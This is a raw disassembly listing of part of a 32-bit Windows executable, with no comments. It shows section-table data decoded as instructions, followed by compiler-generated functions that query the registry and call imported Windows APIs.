  401e03:	add    BYTE PTR [edi],ch
  401e05:	test   DWORD PTR [eax],eax
  401e07:	add    BYTE PTR [edi-0x7b],bl
  401e0a:	add    BYTE PTR [eax],al
  401e0c:	pop    DWORD PTR [ebp-0x7a300000]
  401e12:	add    BYTE PTR [eax],al
  401e14:	or     eax,0x52000086
  401e19:	push   ebx
  401e1a:	inc    esp
  401e1b:	push   ebx
  401e1c:	or     al,0x83
  401e1e:	rol    dl,1
  401e20:	jne    0x401dcc
  401e22:	mov    ch,0x4e
  401e24:	mov    ch,0xc7
  401e26:	inc    esi
  401e27:	dec    ebx
  401e28:	ds repz mov ch,0xae
  401e2c:	add    DWORD PTR [eax],eax
  401e2e:	add    BYTE PTR [eax],al
  401e30:	inc    ecx
  401e31:	push   esp
  401e32:	inc    edx
  401e33:	jb     0x401ea4
  401e35:	imul   esp,DWORD PTR [ebp+0x72],0x2e
  401e39:	jo     0x401e9f
  401e3b:	bound  eax,QWORD PTR [eax]
	...
  401e51:	add    BYTE PTR [eax],al
  401e53:	add    BYTE PTR [edi+0x43],al
  401e56:	push   esp
  401e57:	dec    esp
  401e58:	add    BYTE PTR [eax],dl
  401e5a:	add    BYTE PTR [eax],al
  401e5c:	add    al,0x0
  401e5e:	add    BYTE PTR [eax],al
  401e60:	cs inc ebx
  401e62:	push   edx
  401e63:	push   esp
  401e64:	and    al,0x58
  401e66:	inc    ebx
  401e67:	inc    ecx
  401e68:	add    BYTE PTR [eax],al
  401e6a:	add    BYTE PTR [eax],al
  401e6c:	add    al,0x10
  401e6e:	add    BYTE PTR [eax],al
  401e70:	add    al,0x0
  401e72:	add    BYTE PTR [eax],al
  401e74:	cs inc ebx
  401e76:	push   edx
  401e77:	push   esp
  401e78:	and    al,0x58
  401e7a:	inc    ebx
  401e7b:	inc    ecx
  401e7c:	inc    ecx
  401e7d:	add    BYTE PTR [eax],al
  401e7f:	add    BYTE PTR [eax],cl
  401e81:	adc    BYTE PTR [eax],al
  401e83:	add    BYTE PTR [eax],dl
  401e85:	add    BYTE PTR [eax],al
  401e87:	add    BYTE PTR [esi],ch
  401e89:	inc    ebx
  401e8a:	push   edx
  401e8b:	push   esp
  401e8c:	and    al,0x58
  401e8e:	inc    ebx
  401e8f:	dec    esp
  401e90:	add    BYTE PTR [eax],al
  401e92:	add    BYTE PTR [eax],al
  401e94:	sbb    BYTE PTR [eax],dl
  401e96:	add    BYTE PTR [eax],al
  401e98:	add    al,0x0
  401e9a:	add    BYTE PTR [eax],al
  401e9c:	cs inc ebx
  401e9e:	push   edx
  401e9f:	push   esp
  401ea0:	and    al,0x58
  401ea2:	inc    ebx
  401ea3:	pop    edx
  401ea4:	add    BYTE PTR [eax],al
  401ea6:	add    BYTE PTR [eax],al
  401ea8:	sbb    al,0x10
  401eaa:	add    BYTE PTR [eax],al
  401eac:	add    al,0x0
  401eae:	add    BYTE PTR [eax],al
  401eb0:	cs inc ebx
  401eb2:	push   edx
  401eb3:	push   esp
  401eb4:	and    al,0x58
  401eb6:	dec    ecx
  401eb7:	inc    ecx
  401eb8:	add    BYTE PTR [eax],al
  401eba:	add    BYTE PTR [eax],al
  401ebc:	and    BYTE PTR [eax],dl
  401ebe:	add    BYTE PTR [eax],al
  401ec0:	add    al,0x0
  401ec2:	add    BYTE PTR [eax],al
  401ec4:	cs inc ebx
  401ec6:	push   edx
  401ec7:	push   esp
  401ec8:	and    al,0x58
  401eca:	dec    ecx
  401ecb:	inc    ecx
  401ecc:	inc    ecx
  401ecd:	add    BYTE PTR [eax],al
  401ecf:	add    BYTE PTR [eax+edx*1],ah
  401ed2:	add    BYTE PTR [eax],al
  401ed4:	add    al,0x0
  401ed6:	add    BYTE PTR [eax],al
  401ed8:	cs inc ebx
  401eda:	push   edx
  401edb:	push   esp
  401edc:	and    al,0x58
  401ede:	dec    ecx
  401edf:	pop    ecx
  401ee0:	add    BYTE PTR [eax],al
  401ee2:	add    BYTE PTR [eax],al
  401ee4:	sub    BYTE PTR [eax],dl
  401ee6:	add    BYTE PTR [eax],al
  401ee8:	add    al,0x0
  401eea:	add    BYTE PTR [eax],al
  401eec:	cs inc ebx
  401eee:	push   edx
  401eef:	push   esp
  401ef0:	and    al,0x58
  401ef2:	dec    ecx
  401ef3:	pop    edx
  401ef4:	add    BYTE PTR [eax],al
  401ef6:	add    BYTE PTR [eax],al
  401ef8:	sub    al,0x10
  401efa:	add    BYTE PTR [eax],al
  401efc:	js     0x401efe
  401efe:	add    BYTE PTR [eax],al
  401f00:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  401f08:	add    BYTE PTR [eax],al
  401f0a:	add    BYTE PTR [eax],al
  401f0c:	mov    al,0x10
  401f0e:	add    BYTE PTR [eax],al
  401f10:	add    BYTE PTR ds:0x722e0000,cl
  401f16:	fs popa 
  401f18:	je     0x401f7b
  401f1a:	add    BYTE PTR [eax],al
  401f1c:	mov    al,0x1d
  401f1e:	add    BYTE PTR [eax],al
  401f20:	push   0x2e000000
  401f25:	jb     0x401f8b
  401f27:	popa   
  401f28:	je     0x401f8b
  401f2a:	and    al,0x73
  401f2c:	js     0x401f92
  401f2e:	popa   
  401f2f:	je     0x401f92
  401f31:	add    BYTE PTR [eax],al
  401f33:	add    BYTE PTR [eax],bl
  401f35:	push   ds
  401f36:	add    BYTE PTR [eax],al
  401f38:	pusha  
  401f39:	add    al,BYTE PTR [eax]
  401f3b:	add    BYTE PTR [esi],ch
  401f3d:	jb     0x401fa3
  401f3f:	popa   
  401f40:	je     0x401fa3
  401f42:	and    al,0x7a
  401f44:	jp     0x401fc0
  401f46:	bound  esp,QWORD PTR fs:[edi+0x0]
  401f4a:	add    BYTE PTR [eax],al
  401f4c:	js     0x401f6e
  401f4e:	add    BYTE PTR [eax],al
  401f50:	enter  0x0,0x0
  401f54:	cs je  0x401fbc
  401f57:	js     0x401fcd
  401f59:	and    al,0x64
  401f5b:	imul   eax,DWORD PTR [eax],0x40000000
  401f61:	and    DWORD PTR [eax],eax
  401f63:	add    bl,cl
  401f65:	pop    esi
  401f66:	add    BYTE PTR [eax],al
  401f68:	cs je  0x401fd0
  401f6b:	js     0x401fe1
  401f6d:	and    al,0x6d
  401f6f:	outs   dx,BYTE PTR ds:[esi]
  401f70:	add    BYTE PTR [eax],al
  401f72:	add    BYTE PTR [eax],al
  401f74:	or     eax,DWORD PTR [eax+0x61d0000]
  401f7a:	add    BYTE PTR [eax],al
  401f7c:	cs je  0x401fe4
  401f7f:	js     0x401ff5
  401f81:	and    al,0x78
  401f83:	add    BYTE PTR [eax],ch
  401f85:	xchg   BYTE PTR [eax],al
  401f87:	add    BYTE PTR [eax+0x0],bl
  401f8a:	add    BYTE PTR [eax],al
  401f8c:	cs je  0x401ff4
  401f8f:	js     0x402005
  401f91:	and    al,0x79
  401f93:	add    BYTE PTR fs:[eax],al
  401f96:	add    BYTE PTR [eax],al
  401f98:	add    BYTE PTR [esi+0x7480000],0x0
  401f9f:	add    BYTE PTR [esi],ch
  401fa1:	js     0x402007
  401fa3:	popa   
  401fa4:	je     0x402007
  401fa6:	and    al,0x78
  401fa8:	add    BYTE PTR [eax],al
  401faa:	add    BYTE PTR [eax],al
  401fac:	add    BYTE PTR [eax+0x3e00000],dl
  401fb2:	add    BYTE PTR [eax],al
  401fb4:	cs fs popa 
  401fb7:	je     0x40201a
  401fb9:	add    BYTE PTR [eax],al
  401fbb:	add    al,ah
  401fbd:	xchg   ebx,eax
  401fbe:	add    BYTE PTR [eax],al
  401fc0:	and    BYTE PTR [eax],al
  401fc2:	add    BYTE PTR [eax],al
  401fc4:	cs fs popa 
  401fc7:	je     0x40202a
  401fc9:	and    al,0x72
  401fcb:	add    BYTE PTR [eax],al
  401fcd:	xchg   esp,eax
  401fce:	add    BYTE PTR [eax],al
  401fd0:	and    BYTE PTR [eax+eax*1],al
  401fd3:	add    BYTE PTR [esi],ch
  401fd5:	bound  esi,QWORD PTR [ebx+0x73]
  401fd8:	add    BYTE PTR [eax],al
  401fda:	add    BYTE PTR [eax],al
  401fdc:	add    BYTE PTR [eax+0x20c0000],ah
  401fe2:	add    BYTE PTR [eax],al
  401fe4:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x352461
  401fed:	add    BYTE PTR [eax],al
  401fef:	add    BYTE PTR [edx+eiz*4],cl
  401ff2:	add    BYTE PTR [eax],al
  401ff4:	add    al,0x0
  401ff6:	add    BYTE PTR [eax],al
  401ff8:	xor    BYTE PTR cs:[eax],dh
  401ffb:	arpl   WORD PTR [esi+0x67],sp
  401ffe:	add    BYTE PTR [eax],al
  402000:	adc    BYTE PTR [edx+0xa00000],ah
  402006:	add    BYTE PTR [eax],al
  402008:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x322461
  402011:	add    BYTE PTR [eax],al
  402013:	add    BYTE PTR [eax+0x140000a2],dh
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [esi],ch
  40201d:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x332461
  402025:	add    BYTE PTR [eax],al
  402027:	add    ah,al
  402029:	mov    ds:0x20c0000,al
  40202e:	add    BYTE PTR [eax],al
  402030:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x342461
  402039:	add    BYTE PTR [eax],al
  40203b:	add    al,dl
  40203d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40203e:	add    BYTE PTR [eax],al
  402040:	fimul  WORD PTR [eax]
  402042:	add    BYTE PTR [eax],al
  402044:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x362461
  40204d:	add    BYTE PTR [eax],al
  40204f:	add    BYTE PTR [eax],al
  402051:	mov    al,0x0
  402053:	add    BYTE PTR [eax+0x2e000000],ch
  402059:	jb     0x4020ce
  40205b:	jb     0x4020c0
  40205d:	and    al,0x30
  40205f:	xor    DWORD PTR [eax],eax
  402061:	add    BYTE PTR [eax],al
  402063:	add    BYTE PTR [eax-0x7fffff50],dh
  402069:	add    al,0x0
  40206b:	add    BYTE PTR [esi],ch
  40206d:	jb     0x4020e2
  40206f:	jb     0x4020d4
  402071:	and    al,0x30
  402073:	xor    al,BYTE PTR [eax]
	...
  40207d:	add    BYTE PTR [eax],al
  40207f:	add    bh,bh
  402081:	adc    eax,0x40a120
  402086:	push   0x408630
  40208b:	mov    DWORD PTR ds:0x40977c,0x4013c0
  402095:	mov    ds:0x409780,eax
  40209a:	mov    BYTE PTR ds:0x409784,0x0
  4020a1:	call   0x407d58
  4020a6:	pop    ecx
  4020a7:	ret    
  4020a8:	int3   
  4020a9:	int3   
  4020aa:	int3   
  4020ab:	int3   
  4020ac:	int3   
  4020ad:	int3   
  4020ae:	int3   
  4020af:	int3   
  4020b0:	push   0x408640
  4020b5:	call   0x407d58
  4020ba:	pop    ecx
  4020bb:	ret    
  4020bc:	int3   
  4020bd:	int3   
  4020be:	int3   
  4020bf:	int3   
  4020c0:	call   0x407226
  4020c5:	push   0x408650
  4020ca:	call   0x407d58
  4020cf:	pop    ecx
  4020d0:	ret    
  4020d1:	int3   
  4020d2:	int3   
  4020d3:	int3   
  4020d4:	int3   
  4020d5:	int3   
  4020d6:	int3   
  4020d7:	int3   
  4020d8:	int3   
  4020d9:	int3   
  4020da:	int3   
  4020db:	int3   
  4020dc:	int3   
  4020dd:	int3   
  4020de:	int3   
  4020df:	int3   
  4020e0:	mov    edi,edi
  4020e2:	push   esi
  4020e3:	push   edi
  4020e4:	push   0x18
  4020e6:	xor    edi,edi
  4020e8:	mov    esi,0x4097d4
  4020ed:	push   edi
  4020ee:	push   esi
  4020ef:	call   DWORD PTR ds:0x40a1a0
  4020f5:	add    esp,0xc
  4020f8:	mov    DWORD PTR ds:0x4097f0,edi
  4020fe:	mov    ecx,esi
  402100:	mov    DWORD PTR ds:0x4097f4,edi
  402106:	mov    DWORD PTR ds:0x4097f8,edi
  40210c:	mov    DWORD PTR ds:0x4097d0,0x2c
  402116:	mov    DWORD PTR ds:0x4097ec,edi
  40211c:	call   0x40740c
  402121:	test   eax,eax
  402123:	jns    0x402132
  402125:	mov    BYTE PTR ds:0x4097fc,0x1
  40212c:	mov    DWORD PTR ds:0x4097d0,edi
  402132:	push   0x408670
  402137:	call   0x407d58
  40213c:	pop    ecx
  40213d:	pop    edi
  40213e:	pop    esi
  40213f:	ret    
  402140:	int3   
  402141:	int3   
  402142:	int3   
  402143:	int3   
  402144:	int3   
  402145:	mov    edi,edi
  402147:	push   esi
  402148:	mov    esi,ecx
  40214a:	cmp    DWORD PTR [esi],0x0
  40214d:	je     0x40215a
  40214f:	push   DWORD PTR [esi]
  402151:	call   DWORD PTR ds:0x40a034
  402157:	and    DWORD PTR [esi],0x0
  40215a:	pop    esi
  40215b:	ret    
  40215c:	int3   
  40215d:	int3   
  40215e:	int3   
  40215f:	int3   
  402160:	int3   
  402161:	mov    edi,edi
  402163:	push   ebp
  402164:	mov    ebp,esp
  402166:	push   ecx
  402167:	push   ecx
  402168:	lea    eax,[ebp-0x4]
  40216b:	mov    DWORD PTR [ebp-0x4],0x4
  402172:	push   eax
  402173:	push   DWORD PTR [ebp+0xc]
  402176:	lea    eax,[ebp-0x8]
  402179:	push   eax
  40217a:	push   0x0
  40217c:	push   DWORD PTR [ebp+0x8]
  40217f:	push   DWORD PTR [ecx]
  402181:	call   DWORD PTR ds:0x40a010
  402187:	test   eax,eax
  402189:	jne    0x402198
  40218b:	mov    eax,DWORD PTR [ebp-0x8]
  40218e:	sub    eax,0x4
  402191:	neg    eax
  402193:	sbb    eax,eax
  402195:	and    eax,0xd
  402198:	mov    esp,ebp
  40219a:	pop    ebp
  40219b:	ret    0x8
  40219e:	int3   
  40219f:	int3   
  4021a0:	int3   
  4021a1:	int3   
  4021a2:	int3   
  4021a3:	mov    edi,edi
  4021a5:	push   ebp
  4021a6:	mov    ebp,esp
  4021a8:	push   ecx
  4021a9:	push   ecx
  4021aa:	push   ebx
  4021ab:	push   esi
  4021ac:	mov    esi,DWORD PTR [ebp+0xc]
  4021af:	xor    ebx,ebx
  4021b1:	push   edi
  4021b2:	mov    edi,DWORD PTR [ebp+0x10]
  4021b5:	mov    eax,DWORD PTR [edi]
  4021b7:	add    eax,eax
  4021b9:	mov    DWORD PTR [edi],ebx
  4021bb:	mov    DWORD PTR [ebp-0x8],eax
  4021be:	lea    eax,[ebp-0x8]
  4021c1:	push   eax
  4021c2:	push   esi
  4021c3:	lea    eax,[ebp-0x4]
  4021c6:	push   eax
  4021c7:	push   ebx
  4021c8:	push   DWORD PTR [ebp+0x8]
  4021cb:	push   DWORD PTR [ecx]
  4021cd:	call   DWORD PTR ds:0x40a010
  4021d3:	test   eax,eax
  4021d5:	jne    0x402210
  4021d7:	cmp    DWORD PTR [ebp-0x4],0x1
  4021db:	je     0x4021e8
  4021dd:	cmp    DWORD PTR [ebp-0x4],0x2
  4021e1:	je     0x4021e8
  4021e3:	push   0xd
  4021e5:	pop    eax
  4021e6:	jmp    0x402210
  4021e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4021eb:	test   esi,esi
  4021ed:	je     0x40220a
  4021ef:	test   ecx,ecx
  4021f1:	je     0x402205
  4021f3:	test   cl,0x1
  4021f6:	jne    0x4021e3
  4021f8:	mov    eax,ecx
  4021fa:	shr    eax,1
  4021fc:	cmp    WORD PTR [esi+eax*2-0x2],bx
  402201:	je     0x40220a
  402203:	jmp    0x4021e3
  402205:	xor    eax,eax
  402207:	mov    WORD PTR [esi],ax
  40220a:	shr    ecx,1
  40220c:	xor    eax,eax
  40220e:	mov    DWORD PTR [edi],ecx
  402210:	pop    edi
  402211:	pop    esi
  402212:	pop    ebx
  402213:	mov    esp,ebp
  402215:	pop    ebp
  402216:	ret    0xc
  402219:	int3   
  40221a:	int3   
  40221b:	int3   
  40221c:	int3   
  40221d:	int3   
  40221e:	mov    edi,edi
  402220:	push   ebp
  402221:	mov    ebp,esp
  402223:	sub    esp,0x2c
  402226:	mov    eax,ds:0x409004
  40222b:	xor    eax,ebp
  40222d:	mov    DWORD PTR [ebp-0x4],eax
  402230:	push   ebx
  402231:	xor    ebx,ebx
  402233:	call   DWORD PTR ds:0x40a054
  402239:	push   eax
  40223a:	call   DWORD PTR ds:0x40a144
  402240:	test   eax,eax
  402242:	je     0x402288
  402244:	push   esi
  402245:	push   edi
  402246:	mov    esi,0x4010bc
  40224b:	lea    edi,[ebp-0x2c]
  40224e:	push   ebx
  40224f:	push   0x12
  402251:	lea    ecx,[ebp-0x18]
  402254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402255:	push   ecx
  402256:	push   0x2
  402258:	push   eax
  402259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40225a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40225b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40225c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40225e:	call   DWORD PTR ds:0x40a150
  402264:	pop    edi
  402265:	pop    esi
  402266:	test   eax,eax
  402268:	je     0x402288
  40226a:	xor    eax,eax
  40226c:	mov    WORD PTR [ebp-0x8],ax
  402270:	lea    eax,[ebp-0x2c]
  402273:	push   eax
  402274:	lea    eax,[ebp-0x18]
  402277:	push   eax
  402278:	call   DWORD PTR ds:0x40a1ec
  40227e:	pop    ecx
  40227f:	pop    ecx
  402280:	test   eax,eax
  402282:	jne    0x402288
  402284:	mov    bl,0x1
  402286:	jmp    0x4022a6
  402288:	push   0x4010d0
  40228d:	push   ebx
  40228e:	push   0x100000
  402293:	call   DWORD PTR ds:0x40a048
  402299:	test   eax,eax
  40229b:	je     0x4022a6
  40229d:	push   eax
  40229e:	mov    bl,0x1
  4022a0:	call   DWORD PTR ds:0x40a05c
  4022a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4022a9:	mov    al,bl
  4022ab:	xor    ecx,ebp
  4022ad:	pop    ebx
  4022ae:	call   0x407750
  4022b3:	mov    esp,ebp
  4022b5:	pop    ebp
  4022b6:	ret    
  4022b7:	int3   
  4022b8:	int3   
  4022b9:	int3   
  4022ba:	int3   
  4022bb:	int3   
  4022bc:	int3   
  4022bd:	int3   
  4022be:	int3   
  4022bf:	int3   
  4022c0:	mov    edi,edi
  4022c2:	push   ebp
  4022c3:	mov    ebp,esp
  4022c5:	push   ecx
  4022c6:	mov    eax,DWORD PTR [ebp+0x10]
  4022c9:	push   ebx
  4022ca:	xor    ebx,ebx
  4022cc:	push   esi
  4022cd:	mov    esi,DWORD PTR [ebp+0xc]
  4022d0:	mov    DWORD PTR [eax],ebx
  4022d2:	mov    eax,DWORD PTR [ebp+0x8]
  4022d5:	push   edi
  4022d6:	sub    eax,0x4
  4022d9:	je     0x4022ed
  4022db:	sub    eax,0x1
  4022de:	je     0x4022e5
  4022e0:	push   0x57
  4022e2:	pop    eax
  4022e3:	jmp    0x40232d
  4022e5:	mov    edi,ebx
  4022e7:	mov    eax,ebx
  4022e9:	mov    dl,bl
  4022eb:	jmp    0x402310
  4022ed:	push   DWORD PTR [ebp+0x14]
  4022f0:	call   DWORD PTR ds:0x40a014
  4022f6:	mov    edi,edx
  4022f8:	mov    ebx,eax
  4022fa:	push   edi
  4022fb:	push   ebx
  4022fc:	call   DWORD PTR ds:0x40a028
  402302:	push   edi
  402303:	push   ebx
  402304:	mov    BYTE PTR [ebp-0x1],al
  402307:	call   DWORD PTR ds:0x40a00c
  40230d:	mov    dl,BYTE PTR [ebp-0x1]
  402310:	test   BYTE PTR [esi+0x1a],0x2
  402314:	je     0x40231f
  402316:	mov    ecx,DWORD PTR [esi+0x10]
  402319:	test   ecx,ecx
  40231b:	je     0x40231f
  40231d:	mov    esi,ecx
  40231f:	mov    DWORD PTR [esi+0x10],ebx
  402322:	mov    DWORD PTR [esi+0x14],edi
  402325:	mov    BYTE PTR [esi+0x19],dl
  402328:	mov    DWORD PTR [esi+0x1c],eax
  40232b:	xor    eax,eax
  40232d:	pop    edi
  40232e:	pop    esi
  40232f:	pop    ebx
  402330:	mov    esp,ebp
  402332:	pop    ebp
  402333:	ret    0x10
  402336:	int3   
  402337:	int3   
  402338:	int3   
  402339:	int3   
  40233a:	int3   
  40233b:	mov    edi,edi
  40233d:	push   ebp
  40233e:	mov    ebp,esp
  402340:	sub    esp,0x48
  402343:	mov    eax,ds:0x409004
  402348:	xor    eax,ebp
  40234a:	mov    DWORD PTR [ebp-0x4],eax
  40234d:	push   ebx
  40234e:	push   esi
  40234f:	push   edi
  402350:	push   0x10
  402352:	pop    ecx
  402353:	mov    esi,0x401108
  402358:	lea    edi,[ebp-0x44]
  40235b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40235d:	mov    ebx,0x104
  402362:	lea    ecx,[ebp-0x48]
  402365:	xor    edi,edi
  402367:	xor    esi,esi
  402369:	push   ebx
  40236a:	mov    DWORD PTR [ebp-0x48],edi
  40236d:	inc    esi
  40236e:	call   0x402acb
  402373:	test   al,al
  402375:	je     0x4023a4
  402377:	push   ebx
  402378:	push   DWORD PTR [ebp-0x48]
  40237b:	lea    eax,[ebp-0x44]
  40237e:	push   eax
  40237f:	call   DWORD PTR ds:0x40a064
  402385:	test   eax,eax
  402387:	je     0x4023a4
  402389:	cmp    eax,ebx
  40238b:	ja     0x4023a4
  40238d:	push   edi
  40238e:	push   edi
  40238f:	push   0x401148
  402394:	push   DWORD PTR [ebp-0x48]
  402397:	push   edi
  402398:	push   edi
  402399:	call   DWORD PTR ds:0x40a128
  40239f:	cmp    eax,0x20
  4023a2:	jg     0x4023a6
  4023a4:	mov    esi,edi
  4023a6:	push   DWORD PTR [ebp-0x48]
  4023a9:	call   DWORD PTR ds:0x40a1e8
  4023af:	pop    ecx
  4023b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4023b3:	mov    eax,esi
  4023b5:	pop    edi
  4023b6:	pop    esi
  4023b7:	xor    ecx,ebp
  4023b9:	pop    ebx
  4023ba:	call   0x407750
  4023bf:	mov    esp,ebp
  4023c1:	pop    ebp
  4023c2:	ret    
  4023c3:	int3   
  4023c4:	int3   
  4023c5:	int3   
  4023c6:	int3   
  4023c7:	int3   
  4023c8:	mov    edi,edi
  4023ca:	push   esi
  4023cb:	mov    esi,ecx
  4023cd:	push   DWORD PTR [esi]
  4023cf:	call   DWORD PTR ds:0x40a1e8
  4023d5:	and    DWORD PTR [esi],0x0
  4023d8:	pop    ecx
  4023d9:	pop    esi
  4023da:	ret    
  4023db:	int3   
  4023dc:	int3   
  4023dd:	int3   
  4023de:	int3   
  4023df:	int3   
  4023e0:	mov    edi,edi
  4023e2:	push   ebp
  4023e3:	mov    ebp,esp
  4023e5:	sub    esp,0x14
  4023e8:	mov    eax,ds:0x409004
  4023ed:	xor    eax,ebp
  4023ef:	mov    DWORD PTR [ebp-0x4],eax
  4023f2:	push   ebx
  4023f3:	push   edi
  4023f4:	xor    ebx,ebx
  4023f6:	mov    WORD PTR [ebp-0x8],0x500
  4023fc:	lea    eax,[ebp-0x10]
  4023ff:	mov    DWORD PTR [ebp-0x14],ebx
  402402:	push   eax
  402403:	push   ebx
  402404:	push   ebx
  402405:	push   ebx
  402406:	push   ebx
  402407:	push   ebx
  402408:	push   ebx
  402409:	push   ebx
  40240a:	push   0x4
  40240c:	xor    edi,edi
  40240e:	mov    DWORD PTR [ebp-0xc],ebx
  402411:	inc    edi
  402412:	lea    eax,[ebp-0xc]
  402415:	push   edi
  402416:	push   eax
  402417:	call   DWORD PTR ds:0x40a018
  40241d:	neg    eax
  40241f:	sbb    eax,eax
  402421:	and    eax,DWORD PTR [ebp-0x10]
  402424:	mov    DWORD PTR [ebp-0x10],eax
  402427:	je     0x40244b
  402429:	push   esi
  40242a:	lea    ecx,[ebp-0x14]
  40242d:	push   ecx
  40242e:	push   eax
  40242f:	push   ebx
  402430:	call   DWORD PTR ds:0x40a02c
  402436:	push   DWORD PTR [ebp-0x10]
  402439:	mov    esi,eax
  40243b:	call   DWORD PTR ds:0x40a020
  402441:	test   esi,esi
  402443:	pop    esi
  402444:	je     0x40244b
  402446:	cmp    DWORD PTR [ebp-0x14],ebx
  402449:	jne    0x40244d
  40244b:	mov    edi,ebx
  40244d:	mov    ecx,DWORD PTR [ebp-0x4]
  402450:	mov    eax,edi
  402452:	pop    edi
  402453:	xor    ecx,ebp
  402455:	pop    ebx
  402456:	call   0x407750
  40245b:	mov    esp,ebp
  40245d:	pop    ebp
  40245e:	ret    
  40245f:	int3   
  402460:	int3   
  402461:	int3   
  402462:	int3   
  402463:	int3   
  402464:	mov    edi,edi
  402466:	push   ebp
  402467:	mov    ebp,esp
  402469:	sub    esp,0x220
  40246f:	mov    eax,ds:0x409004
  402474:	xor    eax,ebp
  402476:	mov    DWORD PTR [ebp-0x4],eax
  402479:	push   ebx
  40247a:	push   esi
  40247b:	mov    eax,edx
  40247d:	mov    DWORD PTR [ebp-0x210],0x1
  402487:	mov    esi,ecx
  402489:	mov    DWORD PTR [ebp-0x220],eax
  40248f:	xor    ecx,ecx
  402491:	push   0x4010d0
  402496:	mov    WORD PTR [eax],cx
  402499:	xor    eax,eax
  40249b:	push   eax
  40249c:	push   0x100000
  4024a1:	mov    WORD PTR [ebp-0x204],ax
  4024a8:	call   DWORD PTR ds:0x40a048
  4024ae:	test   eax,eax
  4024b0:	je     0x4024d9
  4024b2:	push   eax
  4024b3:	call   DWORD PTR ds:0x40a05c
  4024b9:	push   0x401270
  4024be:	mov    ebx,0x100
  4024c3:	lea    eax,[ebp-0x204]
  4024c9:	push   ebx
  4024ca:	push   eax
  4024cb:	call   DWORD PTR ds:0x40a1e0
  4024d1:	add    esp,0xc
  4024d4:	jmp    0x402639
  4024d9:	xor    ecx,ecx
  4024db:	mov    ebx,0x100
  4024e0:	mov    DWORD PTR [ebp-0x208],ebx
  4024e6:	mov    DWORD PTR [ebp-0x218],ecx
  4024ec:	mov    DWORD PTR [ebp-0x214],ecx
  4024f2:	push   edi
  4024f3:	mov    edi,ecx
  4024f5:	mov    DWORD PTR [ebp-0x21c],edi
  4024fb:	test   esi,esi
  4024fd:	je     0x40259d
  402503:	lea    eax,[ebp-0x208]
  402509:	mov    DWORD PTR [ebp-0x208],ecx
  40250f:	push   eax
  402510:	push   0x20019
  402515:	push   ecx
  402516:	push   0x401348
  40251b:	push   0x80000001
  402520:	call   DWORD PTR ds:0x40a024
  402526:	mov    esi,eax
  402528:	test   esi,esi
  40252a:	jne    0x402608
  402530:	mov    edi,DWORD PTR [ebp-0x208]
  402536:	mov    DWORD PTR [ebp-0x21c],edi
  40253c:	test   esi,esi
  40253e:	jne    0x402608
  402544:	and    DWORD PTR [ebp-0x20c],eax
  40254a:	lea    ecx,[ebp-0x21c]
  402550:	lea    eax,[ebp-0x20c]
  402556:	push   eax
  402557:	push   0x4012a4
  40255c:	call   0x402161
  402561:	test   eax,eax
  402563:	jne    0x402604
  402569:	cmp    DWORD PTR [ebp-0x20c],eax
  40256f:	je     0x4025fd
  402575:	lea    eax,[ebp-0x208]
  40257b:	mov    DWORD PTR [ebp-0x208],ebx
  402581:	push   eax
  402582:	lea    eax,[ebp-0x204]
  402588:	push   eax
  402589:	push   0x40139c
  40258e:	lea    ecx,[ebp-0x21c]
  402594:	call   0x4021a3
  402599:	mov    esi,eax
  40259b:	jmp    0x402604
  40259d:	lea    eax,[ebp-0x20c]
  4025a3:	mov    DWORD PTR [ebp-0x20c],ecx
  4025a9:	push   eax
  4025aa:	push   0x20019
  4025af:	push   ecx
  4025b0:	push   0x4012b8
  4025b5:	push   0x80000002
  4025ba:	call   DWORD PTR ds:0x40a024
  4025c0:	test   eax,eax
  4025c2:	jne    0x402608
  4025c4:	mov    edi,DWORD PTR [ebp-0x20c]
  4025ca:	lea    eax,[ebp-0x208]
  4025d0:	push   eax
  4025d1:	lea    eax,[ebp-0x204]
  4025d7:	mov    DWORD PTR [ebp-0x21c],edi
  4025dd:	push   eax
  4025de:	push   0x40139c
  4025e3:	lea    ecx,[ebp-0x21c]
  4025e9:	call   0x4021a3
  4025ee:	mov    esi,eax
  4025f0:	test   esi,esi
  4025f2:	jne    0x402608
  4025f4:	cmp    DWORD PTR [ebp-0x208],0x1
  4025fb:	ja     0x402620
  4025fd:	mov    BYTE PTR [ebp-0x210],0x0
  402604:	test   esi,esi
  402606:	je     0x402620
  402608:	push   0x401270
  40260d:	lea    eax,[ebp-0x204]
  402613:	push   ebx
  402614:	push   eax
  402615:	call   DWORD PTR ds:0x40a1e0
  40261b:	add    esp,0xc
  40261e:	xor    esi,esi
  402620:	test   edi,edi
  402622:	je     0x40262b
  402624:	push   edi
  402625:	call   DWORD PTR ds:0x40a034
  40262b:	pop    edi
  40262c:	test   esi,esi
  40262e:	jne    0x402650
  402630:	cmp    BYTE PTR [ebp-0x210],0x0
  402637:	je     0x402650
  402639:	lea    eax,[ebp-0x204]
  40263f:	push   eax
  402640:	push   ebx
  402641:	push   DWORD PTR [ebp-0x220]
  402647:	call   DWORD PTR ds:0x40a1e0
  40264d:	add    esp,0xc
  402650:	mov    ecx,DWORD PTR [ebp-0x4]
  402653:	mov    al,BYTE PTR [ebp-0x210]
  402659:	xor    ecx,ebp
  40265b:	pop    esi
  40265c:	pop    ebx
  40265d:	call   0x407750
  402662:	mov    esp,ebp
  402664:	pop    ebp
  402665:	ret    0x4
  402668:	int3   
  402669:	int3   
  40266a:	int3   
  40266b:	int3   
  40266c:	int3   
  40266d:	mov    edi,edi
  40266f:	push   ebp
  402670:	mov    ebp,esp
  402672:	and    esp,0xfffffff8
  402675:	sub    esp,0x298
  40267b:	mov    eax,ds:0x409004
  402680:	xor    eax,esp
  402682:	mov    DWORD PTR [esp+0x294],eax
  402689:	push   esi
